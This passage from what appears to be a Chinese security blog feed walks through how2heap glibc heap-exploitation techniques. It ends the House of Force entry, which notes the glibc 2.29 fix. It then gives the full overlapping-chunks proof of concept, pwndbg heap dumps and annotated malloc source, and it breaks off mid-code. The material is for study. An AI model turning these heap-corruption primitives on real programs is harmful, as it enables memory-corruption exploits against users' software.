malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span></span><br><span class="line"><span class="comment">//&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞封堵"><a href="#漏洞封堵" class="headerlink" title="漏洞封堵"></a>漏洞封堵</h1><p>在 glibc 2.29 版本开始，加入了对 top_chunk 的大小异常检查：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620612548357-08cb9599-9b7e-40f0-b8ad-2695076cdc15.png#clientId=u11c738a2-06c1-4&from=drop&id=uc6e9161f&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-10%2010.09.04.png&originHeight=256&originWidth=1528&originalType=binary&size=66763&status=done&style=none&taskId=u71759df0-5c40-467b-a9f7-1cb92df92ad" alt="截屏2021-05-10 10.09.04.png"><br>这里 top_chunk 的大小不能大于 av&gt;system_mem（这个值的默认大小为 0x21000，默认情况下是堆区的大小）<br>这就使得这种利用方式载入史册。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(7)-overlapping_chunks</title>
    <link href="https://cyberangel.cn/2021/05/07/how2heap(7)-overlapping_chunks/"/>
    <id>https://cyberangel.cn/2021/05/07/how2heap(7)-overlapping_chunks/</id>
    <published>2021-05-07T00:16:52.000Z</published>
    <updated>2021-07-04T09:57:12.041Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一小节我们介绍 overlapping chunk</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="POC-源码"><a href="#POC-源码" class="headerlink" title="POC 源码"></a>POC 源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nThis is a simple chunks overlapping problem\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s start to allocate 3 chunks on the heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span></span><br><span class="line"><span class="string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span></span><br><span class="line"><span class="string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> evil_chunk_size = <span class="number">0x581</span>;</span><br><span class="line"><span class="keyword">int</span> evil_region_size = <span class="number">0x580</span> - <span class="number">8</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line"> evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* VULNERABILITY */</span></span><br><span class="line">*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line"><span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line"><span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line"><span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">assert(<span class="built_in">strstr</span>((<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p3));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC-分析"><a href="#POC-分析" class="headerlink" title="POC 分析"></a>POC 分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>首先上来申请了三个堆块，并且填充了每个堆块的 user_data，申请之后堆区内存如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">420</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000501</span> #p1(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757750</span>:<span class="number">0x3131313131313131</span><span class="number">0x0000000000000501</span> #p2(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c50</span>:<span class="number">0x3232323232323232</span><span class="number">0x0000000000000081</span> #p3(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757cd0</span>:<span class="number">0x3333333333333333</span><span class="number">0x0000000000020331</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757d10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们 free 掉 p2，让其进入 unsortedbin 中：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620348566068-3c90d905-2859-4cc7-a8fb-5dcee27cdece.png#clientId=ub0fb487e-0307-4&from=drop&id=ub8b15000&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-07%2008.49.21.png&originHeight=674&originWidth=2746&originalType=binary&size=86341&status=done&style=none&taskId=u770a986a-8e63-4e82-9edb-eeb312a949e" alt="截屏2021-05-07 08.49.21.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">420</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000501</span> #p1(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x3131313131313131</span><span class="number">0x3131313131313131</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757750</span>:<span class="number">0x3131313131313131</span><span class="number">0x0000000000000501</span> #p2(<span class="built_in">free</span>-unsortedbin)</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> <span class="meta">#changed</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c50</span>:<span class="number">0x0000000000000500</span><span class="number">0x0000000000000080</span> #p3(<span class="built_in">malloc</span>)</span><br><span class="line">    <span class="meta">#changed</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757cd0</span>:<span class="number">0x3333333333333333</span><span class="number">0x0000000000020331</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757d10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来对 POC 源码的第 54 行下断点，调试到此处，现在代码执行了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* VULNERABILITY */</span></span><br><span class="line">*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line"><span class="comment">/* VULNERABILITY */</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">420</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000501</span> #p1(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x3131313131313131</span><span class="number">0x3131313131313131</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757750</span>:<span class="number">0x3131313131313131</span><span class="number">0x0000000000000581</span> #p2(<span class="built_in">free</span>-unsortedbin)</span><br><span class="line">    #VULNERABILITY</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c50</span>:<span class="number">0x0000000000000500</span><span class="number">0x0000000000000080</span> #p3(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757cd0</span>:<span class="number">0x3333333333333333</span><span class="number">0x0000000000020331</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757d10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来我们 malloc 一个大小为 0x578 堆块，gdb 查看会发现 p3 堆块已经被吞并：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620477941137-5132acb7-237c-47c2-be8e-feb77aa31de0.png#clientId=u4fa999d8-1604-4&from=drop&id=u2219a074&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-08%2020.45.35.png&originHeight=1286&originWidth=2746&originalType=binary&size=155087&status=done&style=none&taskId=u4e14239d-9d24-4309-ba14-cc1984d8114" alt="截屏2021-05-08 20.45.35.png"><br>让我惊讶的是这里对 unsortedbin 中的 free chunk 申请竟然没有对堆块的大小进行检查，算了还是看一下源码是什么吧，引入源码重新调试到此处（b 58 -&gt; r）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) <span class="comment">//检查堆块的大小</span></span><br><span class="line">              || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">   &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">              <span class="comment">//虽然这里检查了unsortedbin的大小，但是只是检查了堆块大小是否小的离谱或大的离谱</span></span><br><span class="line">              <span class="comment">//但是并没有检查堆块所占的实际大小与mchunk_size是否相等</span></span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line"><span class="comment">//省略last_remainder分配......</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck; <span class="comment">//victim从unsortedbin链表中卸下</span></span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb) <span class="comment">//取下来的堆块采用最适算法进行分配</span></span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment"> We may return one of these chunks later.  */</span></span><br><span class="line">      <span class="keyword">if</span> (tcache_nb <span class="comment">//若堆块大小合适则会放入tcache中</span></span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p; <span class="comment">//直到堆块返回也没有检查victim的大小是否与实际相符</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//......</span></span><br><span class="line">        &#125;</span><br><span class="line">--------------------------------------------------------------------</span><br><span class="line">pwndbg&gt; x/<span class="number">420</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000501</span> #p1(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x3131313131313131</span><span class="number">0x3131313131313131</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757750</span>:<span class="number">0x3131313131313131</span><span class="number">0x0000000000000581</span> #p2(<span class="built_in">malloc</span>)</span><br><span class="line">    #VULNERABILITY</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span> #指针不会被清空</span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c50</span>:<span class="number">0x0000000000000500</span><span class="number">0x0000000000000080</span> #p3(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757cd0</span>:<span class="number">0x3333333333333333</span><span class="number">0x0000000000020331</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757d10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line">--------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>Q：为什么这里要申请 0x578（对齐后 mchunk_size==0x581）?<br>A：这里其实为了让堆块尽早返回，因为后面有可能会有检查机制造成触发异常（尽早返回为好）；还有一点就是这个大小可以完全覆盖下一个相邻堆块，这样可以完全控制。<br>现在就会造成堆块重叠，接下来就可以为所欲为了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line"><span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line"><span 